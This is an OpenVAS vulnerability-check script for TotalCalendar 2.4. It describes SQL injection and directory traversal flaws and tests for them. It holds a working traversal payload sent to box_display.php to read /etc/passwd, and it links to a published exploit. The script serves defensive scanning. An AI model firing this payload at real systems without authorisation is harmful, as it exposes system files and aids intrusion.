##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_totalcalendar_sql_inj_n_dir_trav_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# TotalCalendar SQL Injection and Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code and manipulate SQL queries by injecting arbitrary SQL code
  in a user's browser session in context of an affected site.
  Impact Level: Application.";
tag_affected = "TotalCalendar version 2.4";

tag_insight = "The flaw exists due to:
  - An improper validation of user supplied data to 'selectedCal' parameter
    in a 'SwitchCal' action within the 'modfile.php' script.
  - An improper validation of user supplied data to 'box' parameter to script
   'box_display.php'.";
tag_solution = "No solution or patch is available as of 29th July, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.sweetphp.com/nuke/index.php";
tag_summary = "This host is running TotalCalendar and is prone to SQL injection
  and directory traversal vulnerabilities.";

if(description)
{
  script_id(902225);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-08-02 12:38:17 +0200 (Mon, 02 Aug 2010)");
  script_cve_id("CVE-2009-4973", "CVE-2009-4974");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("TotalCalendar SQL Injection and Directory Traversal Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9524");
  script_xref(name : "URL" , value : "http://en.securitylab.ru/nvd/396246.php");
  script_xref(name : "URL" , value : "http://en.securitylab.ru/nvd/396247.php");

  script_description(desc);
  script_summary("Check TotalCalendar vulnerability with attack string");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");

tcPort = get_http_port(default:80);
if(!tcPort){
  tcPort = 80;
}

if(!get_port_state(tcPort)){
  exit(0);
}

foreach dir (make_list("/projects/TotalCalendar", "/TotalCalendar", "/", cgi_dirs()))
{
  sndReq = http_get(item:string(dir , "/index.php"), port:tcPort);
  rcvRes = http_send_recv(port:tcPort, data:sndReq);

  ## Confirm application installation
  if("Event calendar powered by TotalCalendar>" >< rcvRes)
  {
    ## Try expliot and check response
    sndReq = http_get(item:string(dir, "/box_display.php?box=../../../../../" +
                                       "../../../etc/passwd%00.htm"), port:tcPort);
    rcvRes = http_send_recv(port:tcPort, data:sndReq);

    ## Check the Response string
    if("root:/root:/bin/bas" >< rcvRes)
    {
      security_hole(tcPort);
      exit(0);
    }
  }
}
